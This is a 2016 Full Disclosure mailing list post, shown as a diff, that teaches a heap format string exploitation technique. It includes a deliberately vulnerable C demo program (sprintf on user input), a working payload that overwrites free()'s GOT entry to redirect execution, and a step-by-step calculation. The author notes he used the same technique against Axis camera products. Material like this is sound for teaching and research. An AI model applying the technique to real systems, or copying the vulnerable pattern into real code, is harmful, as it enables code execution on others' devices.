@@ -1,0 +1,191 @@
+
+Date: Mon, 5 Sep 2016 21:58:36 +0000
+From: bashis <mcw@...mail.eu>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] Heap 'two-write-where-and-what' format string (FMS) technique
+
+/*
+
+Author: bashis <mcw noemail eu>, 2016
+
+Small example code of 'two-write-where-and-what' format string (FMS) and description how to possible exploit when located on heap.
+Since the technique is 'two-write-where-and-what', it's possible to jump to lower target address than the FMS has counted up to.
+[You will need to check addresses of free() and target() to see if it's matching this example; if not, you will need to recalculate the FMS code]
+
+This example code and description is developed for x86 architecture, how it would work IRL is hard to say,
+as this will need approx 192 MiB heap allocated space to be successfully functional.
+
+However, this is the technique I used for exploiting Axis Communication MPQT/PACS products on MIPSel/ARMel/CRISv32 architectures.
+(Which use far lower addresses that x86)
+Reference: https://www.exploit-db.com/exploits/40125/
+
+Stack output example:
+
+1 0xf756bbf8
+2 0xf7590243
+3 (nil)
+4 0xc10000
+5 0x1
+6 0xfff7cd28 --->----+ Second2 data (Write-Where)
+7 0xfff7cd30 --->----|--+ First2 data (Write-Where)
+8 0xfff7efb6         |  |    HOME data (Not used, only to create space)
+9 0x80487e2 ---<-----+  | Second data (Write-What)
+10 0xfff7ef39           |    PATH data (Not used, only to create space)
+11 0x80487d7 --<--------+ First data (Write-What)
+12 0x20
+13 0x1
+14 0xeb55e008
+
+Successful example:
+
+$ ./heap-fms %134519620u%1c%1c%1c%1c%lnXX%ln%59857u%hn%33513u%hn
+
+first Address: 0xfff7cd30
+first2 Address: 0xfff7cd20
+first data: 0x080487d7
+first2 data: 0xfff7cd30
+
+second Address: 0xfff7cd28
+second2 Address: 0xfff7cd1c
+second data: 0x080487e2
+second2 data: 0xfff7cd28
+
+HOME Address: 0xfff7cd24
+HOME data: 0xfff7efb6
+PATH Address: 0xfff7cd2c
+PATH data: 0xfff7ef39
+
+free() Address: 0x080483a0
+
+SCORE!
+$
+
+Details:
+
+Find the GOT address to free() - that we want to overwrite
+
+$ objdump --dynamic-reloc  ./heap-fms | grep free
+08049b48 R_386_JUMP_SLOT   free
+$
+
+Find the target address we want to write to GOT free() - where we want to jump
+$ objdump -D ./heap-fms | grep target
+0804851b <target>:
+$
+
+FMS code breakdown
+
+          [MSB][LSB]
+free():   0804 9b48
+target(): 0804 851b
+
+FFS, what is: "$ ./heap-fms %134519620u%1c%1c%1c%1c%lnXX%ln%59857u%hn%33513u%hn" ???
+
+%134519620u [Count up to 0x8049b44] // Approx 128 MiB needs to be written in x86 to reach this address...
+%1c         [0x8049b44 + 0x1 = 0x8049b45] (POP's of 1 byte)
+%1c         [0x8049b45 + 0x1 = 0x8049b46] (POP's of 1 byte)
+%1c         [0x8049b46 + 0x1 = 0x8049b47] (POP's of 1 byte)
+%1c         [0x8049b47 + 0x1 = 0x8049b48] (POP's of 1 byte)
+%ln         [First-where: Write 4 bytes (0x8049b48) to 'Second2 data', pointing to free() LSB; Value will appear in 'Second data']
+XX          [Jump up two bytes, to later write in free() MSB; 0x8049b48 + 0x2 = 0x8049b4a]
+%ln         [Second-where: Write 4 bytes (0x8049b4a) to 'First2 data', pointing to free() MSB; Value will appear in 'First data']
+%59857u     [We want to write 0x851b to GOT free() LSB, so we need to calculate one step higher: 0x805851b - 0x8049b4a = 0xe9d1 (= 59857 decimalt)]
+%hn         [First-what: Write two bytes (0x851b) to free() LSB]
+%33513u     [We want to write 0x0804 to GOT free() MSB, so we need to calculate one step higher again: 0x8060804 - 0x805851b = 0x82e9 (= 33513 decimalt)]
+%hn         [Second-what: Write two bytes (0x0804) to free() MSB]
+
+Result: 0x0804851b will be written to GOT free(), and the next free() call will jump to our 'target()'
+
+Compile for x86 with: cc -m32 -o heap-fms heap-fms.c
+
+Have nice day
+/bashis
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+void target() {
+
+  printf("SCORE!\n");
+
+}
+
+void junk(char **argv)
+{
+
+// Could be some code
+
+}
+
+void main(int argc, char **argv, char **envp)
+{
+
+  // Create enough space on heap for executing the FMS
+  char *format_string;
+//  format_string = malloc(268435456); // 256 MiB
+  format_string = malloc(201326292); // 192 MiB
+
+
+  const char *first = "First"; // Will show up on stack as No 11 in above stack example output
+  // Create one possibility to 'pop'
+  char* path = getenv("PATH"); // Will show up on stack as No 10 in above stack example output
+  const char *second = "Second"; // Will show up on stack as No 9 in above stack example output
+  int dummy = 1; // Will show up on stack as No 13 in above stack example output (gcc sorting?)
+  int dummy2 = 0x20; // Will show up on stack as No 12 in above stack example output (gcc sorting?)
+  char* home = getenv("HOME"); // Will show up on stack as No 8 in above stack example output
+
+  const char **first2 = &first; // Will show up on stack as No 7 in above stack example output
+  const char **second2 = &second; // Will show up on stack as No 6 in above stack example output
+
+    sprintf(format_string,argv[1]); // Format string vulnerable
+
+    printf("\n");
+
+    printf("first Address: 0x%08x\n",&first); // Only for references
+    printf("first2 Address: 0x%08x\n",&first2); // Only for references
+
+    // Write what
+    printf("first data: 0x%08x\n",first); // Will show where we are in FMS value counting. will show you what value you written.
+    // Write where
+    printf("first2 data: 0x%08x\n",first2); // This is one of the address we see on the stack; this one we will write to to have the value in "first data"
+
+    printf("\n");
+
+    printf("second Address: 0x%08x\n",&second); // Only for references
+    printf("second2 Address: 0x%08x\n",&second2); // Only for references
+
+    // Write what
+    printf("second data: 0x%08x\n",second); // Will show where we are in FMS value counting. will show you what value you written.
+    // Write where
+    printf("second2 data: 0x%08x\n",second2); // This is one of the address we see on the stack; this one we will write to to have the value in "second data"
+
+    printf("\n");
+
+    printf("HOME Address: 0x%08x\n",&home); // Only for references
+    printf("HOME data: 0x%08x\n",home); // Only for references
+    printf("PATH Address: 0x%08x\n",&path); // Only for references
+    printf("PATH data: 0x%08x\n",path); // Only for references
+
+    printf("\n");
+
+    printf("free() Address: 0x%08x\n",&free); // Only for references
+
+
+    printf("\n");
+
+//    puts(format_string);   // Uncomment to see output FMS
+
+    junk(argv); // Useful for gdb break
+
+    free(format_string); // This call is our target for jumping where we want.
+
+}
+
+
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
